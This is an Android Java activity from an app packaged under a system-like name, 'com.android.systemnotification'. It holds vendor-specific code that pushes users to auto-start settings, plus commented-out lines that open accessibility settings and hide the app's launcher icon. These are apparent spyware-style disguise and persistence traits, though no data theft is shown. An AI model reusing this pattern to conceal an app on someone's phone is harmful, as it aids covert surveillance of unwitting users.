package com.android.systemnotification;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class ConfigurationActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_configuration);

        //autoStart();
        //startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));

        startActivity(new Intent(ConfigurationActivity.this, MainActivity.class));
        finish();

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, ConfigurationActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/

    }

    public void autoStart() {
        if (Build.BRAND.equalsIgnoreCase("xiaomi")) {

            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }

        } else if (Build.BRAND.equalsIgnoreCase("Letv")) {

            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.letv.android.letvsafe",
                        "com.letv.android.letvsafe.AutobootManageActivity"));
                startActivity(intent);
            } catch (Exception e) {

            }

        } else if (Build.BRAND.equalsIgnoreCase("Honor")) {

            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                startActivity(intent);
            } catch (Exception e) {

            }

        } else if (Build.MANUFACTURER.equalsIgnoreCase("oppo")) {

            try {
                Intent intent = new Intent();
                intent.setClassName("com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity");
                startActivity(intent);
            } catch (Exception e) {
                try {
                    Intent intent = new Intent();
                    intent.setClassName("com.oppo.safe",
                            "com.oppo.safe.permission.startup.StartupAppListActivity");
                    startActivity(intent);
                } catch (Exception ex) {
                    try {
                        Intent intent = new Intent();
                        intent.setClassName("com.coloros.safecenter",
                                "com.coloros.safecenter.startupapp.StartupAppListActivity");
                        startActivity(intent);
                    } catch (Exception exx) {

                    }
                }
            }
        } else if (Build.MANUFACTURER.contains("vivo")) {

            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.iqoo.secure",
                        "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"));
                startActivity(intent);
            } catch (Exception e) {
                try {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName("com.vivo.permissionmanager",
                            "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
                    startActivity(intent);
                } catch (Exception ex) {
                    try {
                        Intent intent = new Intent();
                        intent.setClassName("com.iqoo.secure",
                                "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager");
                        startActivity(intent);
                    } catch (Exception exx) {
                        ex.printStackTrace();
                    }
                }
            }
        } else if (Build.MANUFACTURER.equalsIgnoreCase("huawei")) {

            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                startActivity(intent);
            } catch (Exception e) {

            }
        }
    }
}
